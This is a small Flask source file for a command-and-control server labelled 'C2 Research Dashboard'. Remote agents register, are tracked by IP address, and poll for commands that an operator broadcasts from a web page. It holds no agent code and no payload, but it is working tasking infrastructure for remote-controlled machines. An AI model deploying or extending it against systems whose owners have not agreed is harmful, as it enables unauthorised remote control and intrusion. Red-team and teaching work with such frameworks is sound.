from flask import Flask, render_template_string, request, jsonify
import uuid
import queue

app = Flask(__name__)
# Queue per agent to store pending commands
agent_queues = {}
# Stores agent metadata
agents = {}

UI = """
<!DOCTYPE html>
<html>
<head><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css"></head>
<body class="bg-light p-4">
    <h3>C2 Research Dashboard</h3>
    <div class="row">
        <div class="col-4">
            <h5>Active Agents</h5>
            <ul id="agent-list" class="list-group"></ul>
        </div>
        <div class="col-8">
            <input type="text" id="cmd" class="form-control" placeholder="Command (e.g., LIST /)">
            <button onclick="sendCmd()" class="btn btn-primary mt-2">Send Command</button>
            <pre id="output" class="bg-dark text-light p-3 mt-3" style="height:300px;"></pre>
        </div>
    </div>
    <script>
        function sendCmd() {
            let cmd = document.getElementById('cmd').value;
            fetch('/queue_cmd', {method: 'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({cmd: cmd})})
            .then(r => r.json()).then(data => document.getElementById('output').innerText = data.result);
        }
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(UI)

@app.route('/register', methods=['POST'])
def register():
    aid = str(uuid.uuid4())
    agent_queues[aid] = queue.Queue()
    agents[aid] = request.remote_addr
    return jsonify({"id": aid})

@app.route('/poll', methods=['POST'])
def poll():
    aid = request.json.get("id")
    if aid in agent_queues and not agent_queues[aid].empty():
        return jsonify({"cmd": agent_queues[aid].get()})
    return jsonify({"cmd": "NONE"})

@app.route('/queue_cmd', methods=['POST'])
def queue_cmd():
    cmd = request.json.get("cmd")
    for aid in agent_queues:
        agent_queues[aid].put(cmd)
    return jsonify({"result": "Command queued"})

if __name__ == '__main__':
    app.run(port=8080)
